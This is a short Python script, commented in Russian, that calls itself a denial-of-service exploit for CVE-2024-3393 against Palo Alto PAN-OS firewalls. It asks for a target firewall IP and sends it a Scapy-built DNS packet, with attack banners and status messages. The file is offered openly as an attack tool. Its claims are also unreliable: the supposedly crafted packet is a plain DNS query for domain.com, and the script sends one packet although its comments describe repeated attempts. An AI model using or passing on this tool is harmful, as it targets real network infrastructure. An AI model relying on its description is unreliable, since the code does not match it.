from scapy.all import IP, UDP, DNS, DNSQR, send
import time
import os

# =======================================================================
# Описание уязвимости и эксплойта:
# =======================================================================
# CVE-2024-3393: Эта уязвимость в системе DNS безопасности ПО Palo Alto Networks PAN-OS
# позволяет неаутентифицированному атакующему отправить специально подготовленный DNS-запрос,
# который может привести к отказу в обслуживании (DoS) на фаерволе. Это происходит из-за ошибки
# в обработке DNS запросов, что вызывает перезагрузку фаервола.
#
# Эксплойт использует подготовленный DNS-запрос с подделанными данными, который отправляется на
# целевой фаервол. При многократных попытках активации этой уязвимости фаервол переходит в режим
# обслуживания, что блокирует его нормальную работу.
#
# В данном примере используется Scapy для создания и отправки поддельного DNS пакета на целевой фаервол,
# который может вызвать описанную уязвимость.

# ВСЕ РЕСУРСЫ - https://cve.mitre.org/cgi-bin/cvename.cgi?name=2024-3393

def sendpacket(target_ip):
    ip = IP(dst=target_ip)
    udp = UDP(dport=53) 

    # Тут DNS запрос с подделанными данными, замени domain.com. 
    dns = DNS(qr=0, qd=DNSQR(qname="domain.com"))

    packet = ip / udp / dns
    send(packet, verbose=False) 
    print(f"[+] Вредоносный пакет отправлен на {target_ip}")

def main():
    os.system('cls' if os.name == 'nt' else 'clear')

    print("===========================================")
    print("        FEELGOOD_EXPLOIT - BY RENC!         ")
    print("===========================================")
    print("===========================================")
    print("CVE-2024-3393 DoS Exploit | SORRY :D       ")
    print("===========================================")

    target_ip = input("Введите IP-адрес целевого фаервола: ").strip()

    if not target_ip:
        print("Ошибка: Не введен IP-адрес!")
        time.sleep(2)
        return
    
    print(f"\nПодтверждаю атаку на {target_ip}. Подготовка к отправке пакетов...")
    time.sleep(2)
    sendpacket(target_ip)
    print("\n[!] Атака завершена.")
    print("===========================================")
    print("             BY RENC!                     ")
    print("===========================================")

# =======================================================================
# Запуск эксплойта
# =======================================================================
if __name__ == "__main__":
    main()
